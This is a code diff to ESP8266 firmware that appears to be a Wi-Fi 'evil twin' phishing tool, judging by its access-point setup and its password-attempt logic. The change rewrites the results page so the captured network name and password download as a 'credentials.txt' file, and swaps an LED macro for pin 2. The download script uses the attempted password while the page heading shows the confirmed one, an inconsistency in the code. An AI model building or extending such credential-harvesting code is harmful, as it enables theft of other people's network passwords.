@@ -8,8 +8,6 @@
 #include <ESP8266WiFi.h>
 #include <ESP8266WebServer.h>
 
-#define led 2
-
 const byte DNS_PORT = 53;
 IPAddress apIP(192, 168, 6, 1);
 IPAddress subnet_mask(255, 255, 255, 0);
@@ -234,8 +232,23 @@ void handleIndex()
   html_data += "</table><br>"+button_data;
   if (correct_password != "")
   {
-   html_data += "<h1>Results</h1><h3>" + correct_password + "</h3><hr><script>function downloadPassword(){const password = '" + correct_password + "'; const blob = new Blob([password], { type: 'text/plain' }); const link = document.createElement('a'); link.href = URL.createObjectURL(blob); link.download = 'password.txt'; document.body.appendChild(link); link.click(); document.body.removeChild(link); }</script><button onclick='downloadPassword()'>Download Password</button>";
-  } 
+   html_data += "<h1>Results</h1><h3>" + correct_password + "</h3><hr>";
+   html_data += "<script>";
+   html_data += "function downloadPassword() {";
+   html_data += " const ssid = '" + selected_network.ssid + "';";
+   html_data += " const password = '" + try_password + "';";
+   html_data += " const content = 'SSID: ' + ssid + '\\nPassword: ' + password;";
+   html_data += " const blob = new Blob([content], { type: 'text/plain' });";
+   html_data += " const link = document.createElement('a');";
+   html_data += " link.href = URL.createObjectURL(blob);";
+   html_data += " link.download = 'credentials.txt';";
+   html_data += " document.body.appendChild(link);";
+   html_data += " link.click();";
+   html_data += " document.body.removeChild(link);";
+   html_data += "}";
+   html_data += "</script>";
+   html_data += "<button onclick=\"downloadPassword()\">Download Credentials</button>";
+  }
   html_data += "</div></center></body></html>";
   webServer.send(200, "text/html", html_data);
  }
@@ -277,7 +290,7 @@ void RPassBlink()
 {
  for (int counter = 0;counter < 6;counter++)
  {
-  digitalWrite(led, counter % 2);
+  digitalWrite(2, counter % 2);
   delay(500);
  }
 }
@@ -286,15 +299,15 @@ void WPassBlink()
 {
  for (int counter = 0;counter < 4;counter++)
  {
-  digitalWrite(led, counter % 2);
+  digitalWrite(2, counter % 2);
   delay(500);
  }
 }
 
 void setup()
 {
-  pinMode(led, OUTPUT);
-  digitalWrite(led, HIGH);
+  pinMode(2, OUTPUT);
+  digitalWrite(2, HIGH);
   WiFi.mode(WIFI_AP_STA);
   WiFi.softAPConfig(apIP, apIP, subnet_mask);
   WiFi.softAP(ssid, password);
